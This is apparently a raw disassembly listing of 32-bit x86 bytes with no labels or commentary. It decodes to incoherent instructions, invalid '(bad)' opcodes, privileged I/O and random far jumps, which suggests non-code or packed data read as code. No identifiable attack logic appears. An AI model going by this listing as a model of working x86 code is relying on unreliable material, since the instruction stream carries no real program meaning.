  415bd9:	sbb    dl,BYTE PTR [esi+0x7]
  415bdc:	test   al,0xf5
  415bde:	sbb    DWORD PTR [esi-0x3277e651],esi
  415be4:	mov    ds:0x17938147,al
  415be9:	pop    ds
  415bea:	push   es
  415beb:	jae    0x415bd3
  415bed:	sbb    ebx,DWORD PTR [ebp-0x69]
  415bf0:	jae    0x415c5b
  415bf2:	inc    edi
  415bf3:	xor    DWORD PTR [esi-0x7f],ebp
  415bf6:	aad    0x8a
  415bf8:	cdq    
  415bf9:	dec    ebp
  415bfa:	shl    BYTE PTR [ebp-0x6b],1
  415bfd:	cwde   
  415bfe:	shr    BYTE PTR [esi-0x27],0xc9
  415c02:	mov    al,ds:0x2f18f60a
  415c07:	scas   al,BYTE PTR es:[edi]
  415c08:	dec    eax
  415c09:	adc    BYTE PTR [esp+ebp*1+0x3c8b1e9f],cl
  415c10:	push   esi
  415c11:	divps  xmm7,XMMWORD PTR [ebx+0x6ad5b8a0]
  415c18:	add    al,0x0
  415c1a:	(bad)  
  415c1b:	mov    edx,0xeec92e0c
  415c20:	mov    edx,0x930b8a1e
  415c25:	mov    edx,0xd8eb0f4a
  415c2a:	(bad)
  415c2f:	xor    al,0x1e
  415c31:	adc    edi,eax
  415c33:	jp     0x415be5
  415c35:	xchg   esi,eax
  415c36:	or     al,cl
  415c38:	mov    bh,0x53
  415c3a:	and    ch,BYTE PTR [eax-0x70ee62]
  415c40:	adc    eax,0x4cc247e4
  415c45:	into   
  415c46:	pushf  
  415c47:	inc    eax
  415c48:	add    eax,0x2ea9d9c0
  415c4d:	sub    al,0x2a
  415c4f:	dec    esp
  415c50:	mov    esi,0x85b00ac4
  415c55:	cdq    
  415c56:	xchg   edi,eax
  415c57:	lds    ecx,FWORD PTR [ecx]
  415c59:	mov    ds,WORD PTR [ecx-0x23]
  415c5c:	lock pop edi
  415c5e:	not    ah
  415c60:	cmc    
  415c61:	xchg   edi,eax
  415c62:	inc    ebp
  415c63:	add    edx,ebx
  415c65:	sub    al,0xc2
  415c67:	not    BYTE PTR [ebx]
  415c69:	dec    esi
  415c6a:	out    dx,al
  415c6b:	push   cs
  415c6c:	jmp    DWORD PTR [ebp+0x5e3fa84f]
  415c72:	ret    
  415c73:	(bad)  
  415c75:	cwde   
  415c76:	out    0xad,al
  415c78:	es inc esp
  415c7a:	add    eax,0x7d8176c1
  415c7f:	std    
  415c80:	fs and edi,esi
  415c83:	enter  0x7403,0xd4
  415c87:	clc    
  415c88:	outs   dx,DWORD PTR ds:[esi]
  415c89:	mov    ebx,0x420575f8
  415c8e:	leave  
  415c8f:	mov    BYTE PTR [ecx+0x27057242],dh
  415c95:	test   DWORD PTR [ecx-0x2fa962f2],0xcf5ab43
  415c9f:	or     ch,dh
  415ca1:	push   esp
  415ca2:	cdq    
  415ca3:	mov    edx,0xc3f7ea31
  415ca8:	mov    edi,0xa5a26a2
  415cad:	mov    dl,0xcb
  415caf:	sub    eax,0x7f4cd18b
  415cb4:	cmp    BYTE PTR [esi+eax*1+0x7f],ch
  415cb8:	inc    ecx
  415cb9:	jl     0x415c9d
  415cbb:	jne    0x415c78
  415cbd:	jle    0x415c74
  415cbf:	add    al,0xa9
	...
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0x1f18:0xbc5e72f
  415d44:	push   ds
  415d45:	out    dx,eax
  415d46:	add    BYTE PTR [eax],al
  415d48:	cmc    
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    BYTE PTR [ecx-0x76774127],bh
  415d51:	es leave 
  415d53:	jl     0x415d8b
  415d55:	mov    ebp,0xdb63cf1
  415d5a:	add    DWORD PTR [edi-0x6285c6e8],ebx
  415d60:	xchg   ebx,eax
  415d61:	or     esp,DWORD PTR [edx+0x2b54653d]
  415d67:	xchg   ecx,eax
  415d68:	xchg   edi,eax
  415d69:	inc    esi
  415d6a:	xlat   BYTE PTR ds:[ebx]
  415d6b:	into   
  415d6c:	push   ebx
  415d6d:	iret   
  415d6e:	xchg   edi,eax
  415d6f:	adc    eax,0x4315bc2f
  415d74:	out    dx,al
  415d75:	jns    0x415d58
  415d77:	push   0x1
  415d79:	or     eax,0x424dbc26
  415d7e:	xlat   BYTE PTR ds:[ebx]
  415d7f:	adc    BYTE PTR [esi+edx*8-0x66d5049],0x98
  415d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d88:	mov    dl,0x3c
  415d8a:	int3   
  415d8b:	mov    edx,DWORD PTR [esi-0x74]
  415d8e:	lock mov WORD PTR [ecx],ds
  415d91:	movq   mm0,QWORD PTR ds:0xe82ff6a3
  415d98:	xchg   edx,eax
  415d99:	or     esp,DWORD PTR [edi]
  415d9b:	outs   dx,BYTE PTR ds:[esi]
  415d9c:	inc    edx
  415d9d:	scas   al,BYTE PTR es:[edi]
  415d9e:	mov    cl,0xdf
  415da0:	sahf   
  415da1:	aam    0xfe
  415da3:	ret    
  415da4:	push   es
  415da5:	inc    eax
  415da6:	cld    
  415da7:	xlat   BYTE PTR ds:[ebx]
  415da8:	or     BYTE PTR [esi-0x76],bl
  415dab:	push   cs
  415dac:	int    0x28
  415dae:	sub    dl,cl
  415db0:	dec    edi
  415db1:	adc    al,0xe7
  415db3:	in     eax,dx
  415db4:	loope  0x415d9c
  415db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db7:	shl    edi,cl
  415db9:	out    dx,al
  415dba:	retf   
  415dbb:	call   0x42783c14
  415dc0:	aas    
  415dc1:	hlt    
  415dc2:	fcomp  DWORD PTR [esp+edi*1-0x2d972288]
  415dc9:	jae    0x415d83
  415dcb:	add    eax,0x66f8ea20
  415dd0:	inc    ecx
  415dd1:	aas    
  415dd2:	sbb    dh,al
  415dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dd5:	in     eax,0x30
  415dd7:	dec    esp
  415dd8:	push   0xd6b69a11
  415ddd:	mov    esi,0xd1673593
  415de2:	(bad)
  415de5:	loope  0x415db0
  415de7:	sub    esi,edi
  415de9:	neg    DWORD PTR [ecx-0x4]
  415dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ded:	xchg   ebx,eax
  415dee:	(bad)  
  415def:	out    dx,al
  415df0:	call   FWORD PTR [edi-0x78350be1]
  415df6:	xchg   esp,eax
  415df7:	ret    
  415df8:	scas   al,BYTE PTR es:[edi]
  415df9:	scas   eax,DWORD PTR es:[edi]
  415dfa:	jo     0x415e5e
  415dfc:	and    eax,0x22d30f05
  415e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e02:	mov    cl,0xef
  415e04:	jg     0x415e6b
  415e06:	fwait
  415e07:	mov    edi,0x3da537a2
  415e0c:	mov    ah,0x3a
  415e0e:	cmp    DWORD PTR [ebp+0x40526d9],eax
  415e14:	or     ah,dl
  415e16:	std    
  415e17:	adc    al,0xb0
  415e19:	push   ds
  415e1a:	cmp    DWORD PTR [ebx-0x7a5cfa6],esp
  415e20:	dec    ebp
  415e21:	jecxz  0x415e87
  415e23:	daa    
  415e24:	leave  
  415e25:	arpl   WORD PTR [esi-0x75],bp
  415e28:	je     0x415df1
  415e2a:	jmp    0xfed4:0x4aeee832
  415e31:	dec    edi
  415e32:	pop    ss
  415e33:	push   0xffffff92
  415e35:	and    ebx,esi
  415e37:	xchg   esi,eax
  415e38:	ss xchg edx,eax
  415e3a:	les    ecx,FWORD PTR ss:[ebp+0x7]
  415e3e:	test   DWORD PTR [esp+ebp*2+0x0],0x0
	...
  415eb1:	add    BYTE PTR [eax],al
  415eb3:	add    BYTE PTR [edi],dh
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs pop es
  415ec1:	les    ebp,FWORD PTR [edi]
  415ec3:	jmp    0xf5:0xf013
  415eca:	add    BYTE PTR [eax],al
  415ecc:	(bad)  [edi+0x34]
  415ecf:	(bad)  
  415ed0:	jmp    0x415f09
  415ed2:	jno    0x415e9d
  415ed4:	jle    0x415ebf
  415ed6:	pop    esi
  415ed7:	dec    esi
  415ed8:	cmp    eax,0x6b1d30a0
  415edd:	and    al,BYTE PTR [edx-0x352e8fa2]
  415ee3:	test   al,0xc7
  415ee5:	or     DWORD PTR [esi],0x50
  415ee8:	ss retf 0x5ba4
  415eec:	lock cmp ebp,DWORD PTR [edi+0x33]
  415ef0:	xor    ch,BYTE PTR [edx-0xe]
  415ef3:	lock push cs
  415ef5:	cld    
  415ef6:	rcl    DWORD PTR [edx],0x99
  415ef9:	scas   eax,DWORD PTR es:[edi]
  415efa:	inc    esp
  415efb:	in     al,dx
  415efc:	mov    edi,0xb1bf46fa
  415f01:	ss ret 0x3091
  415f05:	push   es
  415f06:	fcomip st,st(7)
  415f08:	jns    0x415f86
  415f0a:	xchg   DWORD PTR [esi+eiz*1+0x5861ccad],eax
  415f11:	pop    edx
  415f12:	sub    ah,bl
  415f14:	or     ebp,DWORD PTR [ebx+0x4ba7b889]
  415f1a:	or     eax,0x38b7aa6e
  415f1f:	sbb    bl,BYTE PTR [ecx+0x7b]
  415f22:	push   0x5aebb72c
  415f27:	sbb    DWORD PTR [ecx+0x5f],ecx
  415f2a:	mov    ebx,0x322fe9b
  415f2f:	retf   0xe132
  415f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f33:	xchg   edx,eax
  415f34:	xor    DWORD PTR ds:0x72a37f3,esp
  415f3a:	ret    
  415f3b:	sbb    BYTE PTR [edx-0x4b],al
  415f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f3f:	es in  al,0xad
  415f42:	cmc    
  415f43:	cmc    
  415f44:	cmp    al,0x40
  415f46:	inc    edi
  415f47:	mov    edi,0x54320fba
  415f4c:	and    DWORD PTR ds:0x7e96a864,ebp
  415f52:	mov    dl,0xe9
  415f54:	mov    eax,0xf3761eea
  415f59:	sbb    BYTE PTR [ebp+0x75],dl
  415f5c:	imul   ecx,DWORD PTR [edx+0x1d693e94],0x62
  415f63:	add    dl,ch
  415f65:	js     0x415f79
  415f67:	scas   eax,DWORD PTR es:[edi]
  415f68:	push   ss
  415f69:	or     edi,esp
  415f6b:	pop    eax
  415f6c:	push   esi
  415f6d:	xor    DWORD PTR [eax],edi
  415f6f:	jae    0x415fac
  415f71:	neg    BYTE PTR [esi+0x4e]
  415f74:	add    BYTE PTR [edx+0x7a],ah
  415f77:	push   eax
  415f78:	fsubr  DWORD PTR [ebx-0x29ea6e2b]
  415f7e:	fcomp  QWORD PTR [edx-0x14f90090]
  415f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f85:	ds dec esp
  415f87:	imul   ebp,DWORD PTR [esi-0x2b],0xc09b2218
  415f8e:	sbb    ch,BYTE PTR [ecx+esi*8-0x29]
  415f92:	ss fwait
  415f94:	xchg   edx,eax
  415f95:	fdiv   DWORD PTR [edi+esi*4+0x4e22a4a2]
  415f9c:	mov    al,0xaf
  415f9e:	fcomi  st,st(1)
  415fa0:	fwait
  415fa1:	cmp    bh,BYTE PTR [edi]
  415fa3:	imul   esp,edx,0xffffffb5
  415fa6:	outs   dx,BYTE PTR ds:[esi]
  415fa7:	fidiv  WORD PTR [ecx-0x23]
  415faa:	inc    edx
  415fab:	into   
  415fac:	mov    BYTE PTR [edx],ch
  415fae:	test   al,0xd0
  415fb0:	rcr    DWORD PTR [edx-0xe1db279],1
  415fb6:	mov    ebx,0x1d0f90d5
  415fbb:	jne    0x416030
  415fbd:	xor    al,al
  415fbf:	xchg   ecx,eax
  415fc0:	test   BYTE PTR [eax],al
	...
  416032:	add    BYTE PTR [eax],al
  416034:	jnp    0x416038
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   esp,DWORD PTR [edi+0x8afbf8d],0xfffffff1
  416046:	add    BYTE PTR [eax],al
  416048:	cmc    
  416049:	add    BYTE PTR [eax],al
  41604b:	add    BYTE PTR [ebx],ah
  41604d:	jle    0x416038
  41604f:	test   eax,0x968a9032
  416054:	xlat   BYTE PTR ds:[ebx]
  416055:	inc    edi
  416056:	mov    bl,0x45
  416058:	push   0xffffffcd
  41605a:	sti    
  41605b:	and    al,BYTE PTR [eax]
  41605d:	cwde   
  41605e:	imul   DWORD PTR [esi]
  416060:	ficomp DWORD PTR [edx+0x1f]
  416063:	dec    esi
  416064:	sbb    BYTE PTR [eax+edx*1],bh
  416067:	jmp    0x28d8:0xde3872a3
  41606e:	(bad)  
  41606f:	mov    ecx,0xa68ccc03
  416074:	data16 fcmovbe st,st(3)
  416077:	mov    ecx,0xfa0819e2
  41607c:	mov    al,ds:0xf1ac4442
  416081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416082:	xor    ch,BYTE PTR [ecx]
  416084:	pushf  
  416085:	push   ebp
  416086:	or     eax,0xe305ff44
  41608b:	cwde   
  41608c:	jmp    0x9c84:0x5cbe8a70
  416093:	mov    ebp,DWORD PTR [eax]
  416095:	pop    eax
  416096:	or     dh,al
  416098:	jmp    0x4160dc
  41609a:	inc    edi
  41609b:	xchg   ebx,eax
  41609c:	add    eax,0x6885d29d
  4160a1:	ret    
  4160a2:	sbb    DWORD PTR [ebx+0x7],esi
  4160a5:	push   esp
  4160a6:	dec    eax
  4160a7:	cmp    dh,BYTE PTR [eax]
  4160a9:	pusha  
  4160aa:	mov    ds:0x5110a274,eax
  4160af:	sahf   
  4160b0:	add    ebp,DWORD PTR [ebx-0x71]
  4160b3:	xchg   edi,eax
  4160b4:	xor    al,0xa8
  4160b6:	push   edx
  4160b7:	cwde   
  4160b8:	and    edi,DWORD PTR ds:0x5955619b
  4160be:	icebp  
  4160bf:	jnp    0x41609a
  4160c1:	dec    ebp
  4160c2:	xchg   BYTE PTR [ebp-0x18],bh
  4160c5:	inc    edx
  4160c6:	xor    al,0xb1
  4160c8:	push   ebx
  4160c9:	out    dx,eax
  4160ca:	cli    
  4160cb:	loopne 0x416132
  4160cd:	cli    
  4160ce:	adc    al,0x3b
  4160d0:	mov    ah,0x17
  4160d2:	pop    es
  4160d3:	daa    
  4160d4:	and    BYTE PTR [ebx+0x713338bf],ah
  4160da:	jnp    0x4160c9
  4160dc:	push   ss
  4160dd:	jnp    0x4160ec
  4160df:	mov    al,ds:0x73beea06
  4160e4:	ret    0x8901
  4160e7:	xor    eax,0x644caaca
  4160ec:	rol    bh,cl
  4160ee:	and    BYTE PTR [ebp+0x1f],bl
  4160f1:	mov    ah,0xbd
  4160f3:	mov    al,ds:0xc615bed9
  4160f8:	scas   al,BYTE PTR es:[edi]
  4160f9:	into   
  4160fa:	jae    0x4160f6
  4160fc:	popf   
  4160fd:	sbb    dh,BYTE PTR [edi]
  4160ff:	push   ebp
  416100:	les    esi,FWORD PTR [ecx+0x58]
  416103:	mov    edx,0xe3a00f05
  416108:	out    dx,al
  416109:	mov    DWORD PTR [edi-0x46],ebp
  41610c:	mov    al,0x4c
  41610e:	add    eax,0x7a48784a
  416113:	outs   dx,BYTE PTR ds:[esi]
  416114:	(bad)  
  416115:	pop    eax
  416116:	imul   ebx,DWORD PTR [eax-0x70],0xffffffcc
  41611a:	(bad)  
  41611b:	xor    DWORD PTR [edx+0x19],ecx
  41611e:	out    dx,al
  41611f:	push   0xde9db1b8
  416124:	pop    edi
  416125:	xchg   DWORD PTR [edx+0x1b7f62c1],edi
  41612b:	xor    bh,BYTE PTR [ebx+0x609a4424]
  416131:	xlat   BYTE PTR ds:[ebx]
  416132:	test   eax,0xd6cdd247
  416137:	xor    bl,0x3d
  41613a:	jne    0x41615a
  41613c:	scas   eax,DWORD PTR es:[edi]
  41613d:	or     ah,BYTE PTR [edx+0x7b]
  416140:	je     0x416142
	...
  4161b2:	add    BYTE PTR [eax],al
  4161b4:	sub    al,0x97
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    ebx,DWORD PTR [ebp-0x23efbc6]
  4161c5:	icebp  
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	cmc    
  4161c9:	add    BYTE PTR [eax],al
  4161cb:	add    BYTE PTR [esi-0x75dc55f5],bl
  4161d1:	push   ecx
  4161d2:	pop    esp
  4161d3:	lods   eax,DWORD PTR ds:[esi]
  4161d4:	fisubr DWORD PTR [edi-0x41]
  4161d7:	valignd zmm7{k7}{z},zmm2,zmm0,0x88
  4161de:	mov    bh,0x8a
  4161e0:	jg     0x4161bf
  4161e2:	dec    esi
  4161e3:	push   es
  4161e4:	inc    ecx
  4161e5:	mov    al,ds:0x5dc1c70
  4161ea:	cmp    dl,BYTE PTR [esi+0x71]
  4161ed:	mov    dl,0x43
  4161ef:	repz (bad) 
  4161f1:	leave  
  4161f2:	aas    
  4161f3:	adc    esi,DWORD PTR ds:[ebp-0x32]
  4161f7:	mov    dl,0x5f
  4161f9:	xchg   esp,eax
  4161fa:	je     0x416230
  4161fc:	int3   
  4161fd:	jo     0x41624b
  4161ff:	retf   0x2c06
  416202:	inc    ebp
  416203:	mov    eax,ds:0xb09a5ecc
  416208:	shl    ch,cl
  41620a:	cmp    eax,0x71f60851
  41620f:	fimul  DWORD PTR [edi-0x74]
  416212:	add    DWORD PTR [ebx+0x614d0427],edi
  416218:	jge    0x41621f
  41621a:	xor    edx,ebx
  41621c:	popa   
  41621d:	cmp    eax,0x1a0632a1
  416222:	(bad)  
  416223:	int3   
  416224:	sbb    al,0xbb
  416226:	push   ds
  416227:	cmc    
  416228:	loop   0x416245
  41622a:	sub    BYTE PTR [ecx],0x8f
  41622d:	mov    cs,WORD PTR [edi]
  41622f:	adc    al,BYTE PTR [eax]
  416231:	or     ah,cl
  416233:	push   0x7c69084c
  416238:	mov    al,ds:0x8e874d9b
  41623d:	and    DWORD PTR [esi-0x37],0xc5ff7ff9
  416244:	imul   esp,edx,0xffffff84
  416247:	dec    eax
  416248:	xchg   edx,eax
  416249:	pop    edx
  41624a:	or     al,0x73
  41624c:	loop   0x4161e5
  41624e:	mov    ecx,0x854ad2a0
  416253:	sub    bl,BYTE PTR [ecx]
  416255:	iret   
  416256:	scas   al,BYTE PTR es:[edi]
  416257:	xchg   BYTE PTR [ecx+0x68],cl
  41625a:	sub    eax,esp
  41625c:	pop    ebp
  41625d:	sahf   
  41625e:	push   esi
  41625f:	inc    eax
  416260:	stos   BYTE PTR es:[edi],al
  416261:	mov    cl,0x9b
  416263:	(bad)  
  416264:	jle    0x4162d1
  416266:	(bad)  
  416268:	out    dx,eax
  416269:	sbb    dh,al
  41626b:	(bad)
  41626f:	cmp    DWORD PTR [edx+0x77732fc2],eax
  416275:	outs   dx,DWORD PTR ds:[esi]
  416276:	sbb    eax,0x85cf9b4a
  41627b:	sbb    ah,ah
  41627d:	aam    0x68
  41627f:	xchg   ebp,eax
  416280:	(bad)  
  416281:	push   0xffffff82
  416283:	mov    ebx,0xfc82fdc8
  416288:	out    dx,al
  416289:	pop    ebx
  41628a:	sbb    eax,0xdb5dfe6e
  41628f:	cmc    
  416290:	push   ebp
  416291:	in     eax,0x72
  416293:	dec    eax
  416294:	push   esi
  416295:	fisub  WORD PTR [eax]
  416297:	(bad)  
  416298:	cmc    
  416299:	pop    esi
  41629a:	and    ecx,esi
  41629c:	xchg   ecx,eax
  41629d:	jl     0x416289
  41629f:	pop    edx
  4162a0:	test   al,0x3e
  4162a2:	mov    DWORD PTR [ecx-0xced13ca],eax
  4162a8:	push   esi
  4162a9:	pop    esi
  4162aa:	fmul   DWORD PTR [eax]
  4162ac:	repz pusha 
  4162ae:	sub    BYTE PTR [esi],ch
  4162b0:	and    al,0x64
  4162b2:	jo     0x416308
  4162b4:	je     0x416246
  4162b6:	xchg   esp,eax
  4162b7:	out    0x71,al
  4162b9:	sub    DWORD PTR [eax-0x65beec1],0x75
  4162c0:	outs   dx,BYTE PTR ds:[esi]
	...
  416331:	add    BYTE PTR [eax],al
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fld    QWORD PTR [ebp+ebx*2+0x23]
  416343:	lahf   
  416344:	repnz repnz add BYTE PTR [eax],al
  416348:	cmc    
  416349:	add    BYTE PTR [eax],al
  41634b:	add    cl,ah
  41634d:	jmp    0xeb5b:0x6b00b01f
  416354:	xchg   DWORD PTR [ebp-0x6b],edx
  416357:	jg     0x4163bb
  416359:	dec    ebp
  41635a:	push   0x5a66d74
  41635f:	fwait
  416360:	or     BYTE PTR [ecx+0x42ca94ca],0x67
  416367:	pop    es
  416368:	dec    edx
  416369:	sub    eax,0x48c9b29a
  41636e:	stos   BYTE PTR es:[edi],al
  41636f:	enter  0xc0a4,0xad
  416373:	clc    
  416374:	push   esi
  416375:	or     esi,DWORD PTR [eax+0x3c8af787]
  41637b:	or     bh,BYTE PTR [ebx-0x18eda49f]
  416381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416382:	jns    0x4163dc
  416384:	hlt    
  416385:	push   edx
  416386:	aas    
  416387:	pop    ebp
  416388:	enter  0x320,0xab
  41638c:	je     0x4163e0
  41638e:	add    eax,0xe7f5bbc3
  416393:	sbb    al,ch
  416395:	int    0x51
  416397:	rcr    DWORD PTR [eax+0x29],0x79
  41639b:	or     edi,DWORD PTR [edx+0x2278505d]
  4163a1:	cmp    DWORD PTR [edi],eax
  4163a3:	sub    eax,0xc00cb7fc
  4163a8:	gs and eax,ecx
  4163ab:	inc    edi
  4163ac:	jns    0x416368
  4163ae:	add    edi,edi
  4163b0:	sbb    edx,edi
  4163b2:	lea    ebp,[ebp+edx*1-0x7dfff339]
  4163b9:	xchg   esp,eax
  4163ba:	outs   dx,BYTE PTR ds:[esi]
  4163bb:	mov    ds:0xbb9d907f,eax
  4163c0:	add    BYTE PTR [eax-0x3d],ah
  4163c3:	shr    BYTE PTR [esi+0x58daee63],0x1
  4163ca:	rsqrtps xmm0,XMMWORD PTR [ebp+0xc]
  4163ce:	xor    eax,0xc66984d4
  4163d3:	test   al,0xd
  4163d5:	mov    db3,edx
  4163d8:	and    dh,al
  4163da:	cli    
  4163db:	adc    BYTE PTR [ecx+eiz*8-0xaf84f48],0xd4
  4163e3:	cmc    
  4163e4:	mov    esi,0x828606c0
  4163e9:	and    eax,0x74a932dc
  4163ee:	mov    ebp,0x62c12514
  4163f3:	shl    DWORD PTR [esi+edx*4-0x1323374f],0x68
  4163fb:	jo     0x416428
  4163fd:	jg     0x4163d7
  4163ff:	call   DWORD PTR [ecx+0x4a]
  416402:	jo     0x416404
  416404:	mov    BYTE PTR [edx+0x51],ch
  416407:	push   edx
  416408:	das    
  416409:	mov    dl,0x3a
  41640b:	dec    eax
  41640c:	cs sub al,0x16
  41640f:	fistp  DWORD PTR [ecx-0x12]
  416412:	xchg   DWORD PTR [eax],ebp
  416414:	jbe    0x4163fc
  416416:	(bad)  
  416417:	int    0xbd
  416419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41641a:	push   ds
  41641b:	push   bx
  41641d:	data16 (bad) [eax-0x4ecba730]
  416424:	adc    BYTE PTR [esi+0x16509fff],0xa6
  41642b:	scas   eax,DWORD PTR es:[edi]
  41642c:	adc    al,0xf9
  41642e:	push   ds
  41642f:	das    
  416430:	aaa    
  416431:	pop    ebx
  416432:	mov    ?,WORD PTR [ecx+0x44]
  416435:	pop    eax
  416436:	fcmovnb st,st(1)
  416438:	push   edx
  416439:	xchg   ebx,eax
  41643a:	push   edx
  41643b:	cmp    al,0xbd
  41643d:	das    
  41643e:	retf   
  41643f:	pop    DWORD PTR [ecx+0x0]
	...
  4164b1:	add    BYTE PTR [eax],al
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	mov    eax,0xe7590ccb
  4164c5:	repz add BYTE PTR [eax],al
  4164c8:	cmc    
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    BYTE PTR [eax-0x5fa31a4],dh
  4164d1:	pop    ss
  4164d2:	xor    BYTE PTR [esi-0x46],bh
  4164d5:	enter  0x2723,0x77
  4164d9:	xchg   ecx,eax
  4164da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164db:	fs jne 0x416512
  4164de:	sub    edi,DWORD PTR [edx]
  4164e0:	fisubr WORD PTR [ecx]
  4164e2:	push   esi
  4164e3:	xor    ebp,DWORD PTR [edi-0x345f5f4d]
  4164e9:	mov    ebp,0x467852a8
  4164ee:	cmc    
  4164ef:	cmp    ebx,DWORD PTR ds:0x5ba41598
  4164f5:	ror    BYTE PTR [edx+eiz*2-0x6c],0x5b
  4164fa:	mov    ch,BYTE PTR [ebx]
  4164fc:	cmp    DWORD PTR [eax],ebx
  4164fe:	inc    ecx
  4164ff:	sti    
  416500:	or     al,0xb0
  416502:	icebp  
  416503:	jecxz  0x416526
  416505:	repz xchg ebp,eax
  416507:	in     eax,dx
  416508:	fldenv [edx+0x75554a64]
  41650e:	test   eax,0x96e9d144
  416513:	add    al,0x96
  416515:	xchg   esp,eax
  416516:	pop    ebx
  416517:	pop    esi
  416518:	hlt    
  416519:	ret    0x77e9
  41651c:	rol    cl,0x97
  41651f:	add    dh,BYTE PTR [edx-0x36]
  416522:	test   al,0x31
  416524:	mov    ds:0x36133d83,al
  416529:	fs inc esi
  41652b:	scas   al,BYTE PTR es:[edi]
  41652c:	cli    
  41652d:	add    eax,0x5f2f8faf
  416532:	mov    eax,0xd56fe833
  416537:	mov    edi,0x83bf750b
  41653c:	(bad)  ds:0xc49e139c
  416542:	dec    ebp
  416543:	fs out 0x51,eax
  416546:	xor    ebp,DWORD PTR [edi-0x2324cbb2]
  41654c:	and    eax,0xba8d2615
  416551:	adc    BYTE PTR [eax-0x4d9caae9],dl
  416557:	mov    esp,0x9cf5d9d9
  41655c:	lahf   
  41655d:	aam    0x4a
  41655f:	mov    eax,DWORD PTR [eax-0x75]
  416562:	xor    esp,0x10dc35ba
  416568:	dec    edi
  416569:	psadbw mm6,QWORD PTR [esi-0x34]
  41656d:	mov    edx,0xc5259646
  416572:	add    al,0x92
  416574:	mov    ebp,0x27bcb0eb
  416579:	mov    edx,0x750923ef
  41657e:	mov    dl,0xad
  416580:	cwde   
  416581:	jp     0x41653b
  416583:	mov    cl,0x2b
  416585:	mov    bl,0xcc
  416587:	push   eax
  416588:	mov    cl,0xb8
  41658a:	push   0xffffff92
  41658c:	test   eax,0xf2c3bb3e
  416591:	push   ebp
  416592:	shl    DWORD PTR [eax],1
  416594:	dec    ebx
  416595:	loope  0x4165c4
  416597:	(bad)  
  416598:	or     BYTE PTR [edi],bh
  41659a:	pop    ecx
  41659b:	clc    
  41659c:	xor    BYTE PTR [edx-0x4db1ad23],dl
  4165a2:	outs   dx,BYTE PTR ds:[esi]
  4165a3:	jmp    0x31d4b3c4
  4165a8:	push   ss
  4165a9:	inc    edx
  4165aa:	xor    esi,DWORD PTR [ebx+ebx*4-0x3992895b]
  4165b1:	ret    
  4165b2:	dec    esp
  4165b3:	sbb    bh,BYTE PTR [esi]
  4165b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b6:	jge    0x41659b
  4165b8:	dec    ebx
  4165b9:	daa    
  4165ba:	add    eax,0x843e5016
  4165bf:	cld    
  4165c0:	or     BYTE PTR [eax],al
	...
  416632:	add    BYTE PTR [eax],al
  416634:	ins    DWORD PTR es:[edi],dx
  416635:	call   0xbafd:0x67ff45bc
  41663c:	retf   
  41663d:	sbb    ah,dh
  41663f:	aad    0x6b
  416641:	in     eax,dx
  416642:	sbb    esi,edi
  416644:	fdivr  st(4),st
  416646:	add    BYTE PTR [eax],al
  416648:	cmc    
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [eax-0x61317469],bl
  416651:	dec    eax
  416652:	and    bh,BYTE PTR [esi-0x27]
  416655:	pop    ebx
  416656:	push   ebx
  416657:	push   edi
  416658:	jge    0x4166a7
  41665a:	aad    0x64
  41665c:	add    bh,BYTE PTR [edi+0x23]
  41665f:	mov    ah,0x53
  416661:	ins    DWORD PTR es:[edi],dx
  416662:	jmp    0x4166ca
  416664:	in     eax,0x9e
  416666:	hlt    
  416667:	xchg   edi,eax
  416668:	enter  0xcc7d,0x19
  41666c:	jmp    0x416698
  41666e:	push   cs
  41666f:	cld    
  416670:	aad    0xe3
  416672:	iret   
  416673:	sti    
  416674:	push   ebp
  416675:	mov    bl,0x56
  416677:	and    DWORD PTR [ebx-0xf],0x6c
  41667b:	arpl   WORD PTR [esi+0x63ad7067],bp
  416681:	ret    0x774f
  416684:	xor    BYTE PTR [ebp+0xf4327ce],ah
  41668a:	mov    al,ds:0x159b2b57
  41668f:	dec    edi
  416690:	push   edx
  416691:	dec    esp
  416692:	xor    ah,ah
  416694:	loopne 0x41670c
  416696:	or     ebx,DWORD PTR [edx+0x56132c5e]
  41669c:	or     DWORD PTR [ebx],ebp
  41669e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41669f:	jle    0x416713
  4166a1:	aad    0x8a
  4166a3:	push   es
  4166a4:	or     eax,0x7cc2c973
  4166a9:	enter  0x5f97,0x34
  4166ad:	loop   0x4166b3
  4166af:	leave  
  4166b0:	int3   
  4166b1:	pop    eax
  4166b2:	inc    edi
  4166b3:	leave  
